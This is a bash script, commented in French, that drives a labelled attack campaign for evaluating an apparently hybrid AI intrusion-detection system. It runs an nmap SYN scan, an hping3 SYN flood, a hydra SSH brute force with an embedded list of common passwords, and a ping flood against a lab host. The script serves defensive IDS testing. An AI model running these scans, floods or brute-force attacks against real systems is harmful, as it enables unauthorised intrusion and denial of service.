#!/bin/bash
# campaign_attacks.sh
# AI-HYBRID-IDS - Campagne d'evaluation etiquetee (section 22), phase attaques.
#
# Enchaine 4 scenarios d'attaque de LABORATOIRE contre UNE machine qui t'appartient,
# chacun repete REPS fois, en enregistrant la verite terrain via run_scenario.sh.
#
# A lancer UNIQUEMENT apres la fin de la baseline (baseline_1), sans autre usage
# reseau intensif pendant l'execution.
#
# Usage:
#   SSH_USER=<whoami sur Termux> ./campaign_attacks.sh
#
# Variables optionnelles: VICTIM (defaut 192.168.100.38), SSH_PORT (defaut 8022),
# REPS (defaut 3), PAUSE_SHORT (defaut 90 s), PAUSE_ICMP (defaut 330 s).
#
# Duree totale: environ 30 a 35 minutes avec les valeurs par defaut.
# Les pauses laissent Suricata clore les flows (timeout ICMP = 300 s) avant le
# scenario suivant, pour que chaque flow puisse etre rattache a son scenario.

set -u

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
RUNNER="$SCRIPT_DIR/run_scenario.sh"

VICTIM="${VICTIM:-192.168.100.38}"
SSH_USER="${SSH_USER:?Definir SSH_USER (resultat de whoami sur Termux)}"
SSH_PORT="${SSH_PORT:-8022}"
REPS="${REPS:-3}"
PAUSE_SHORT="${PAUSE_SHORT:-90}"
PAUSE_ICMP="${PAUSE_ICMP:-330}"

if [ ! -x "$RUNNER" ]; then
    echo "ERREUR: $RUNNER introuvable ou non executable." >&2
    exit 1
fi

echo "Campagne d'attaques de laboratoire"
echo "  Victime : $VICTIM (SSH: $SSH_USER@port $SSH_PORT)"
echo "  Scenarios: port_scan, syn_flood, brute_force, icmp_flood x $REPS repetitions"
read -r -p "Confirmer que $VICTIM est une machine de LABORATOIRE qui t'appartient [oui/N] : " REPLY
if [ "$REPLY" != "oui" ]; then
    echo "Annule."
    exit 4
fi

# Le mot de passe sudo est demande une seule fois ici, pas au milieu de la campagne.
sudo -v || exit 1

WORDLIST="$(mktemp /tmp/ids_wordlist.XXXXXX)"
trap 'rm -f "$WORDLIST"' EXIT
printf '%s\n' password 123456 admin root toor letmein qwerty 12345678 111111 \
    abc123 welcome monkey dragon master login passw0rd iloveyou sunshine \
    princess football shadow 000000 secret test guest changeme azerty \
    motdepasse camtel cameroun garoua termux android user pass 1234 12345 \
    admin123 password1 qwerty123 > "$WORDLIST"

run() {
    # "oui" est fourni au garde-fou de run_scenario.sh (deja confirme ci-dessus).
    echo oui | "$RUNNER" "$@"
}

for rep in $(seq 1 "$REPS"); do
    echo ""
    echo "===== Repetition $rep / $REPS ====="

    run "port_scan_$rep" port_scan "$VICTIM" -- \
        sudo nmap -sS -p 1-1000 "$VICTIM"
    sleep "$PAUSE_SHORT"

    run "syn_flood_$rep" syn_flood "$VICTIM" -- \
        sudo hping3 -S -p 80 -i u2000 -c 3000 "$VICTIM"
    sleep "$PAUSE_SHORT"

    run "brute_force_$rep" brute_force "$VICTIM" -- \
        hydra -l "$SSH_USER" -P "$WORDLIST" -t 4 -s "$SSH_PORT" "ssh://$VICTIM"
    sleep "$PAUSE_SHORT"

    run "icmp_flood_$rep" icmp_flood "$VICTIM" -- \
        sudo ping -f -c 1500 "$VICTIM"
    sleep "$PAUSE_ICMP"
done

echo ""
echo "Campagne terminee. Attends encore ~15 minutes (fin de vie des derniers flows)"
echo "avant de lancer l'analyse. Verite terrain: results/evaluation/ground_truth.csv"
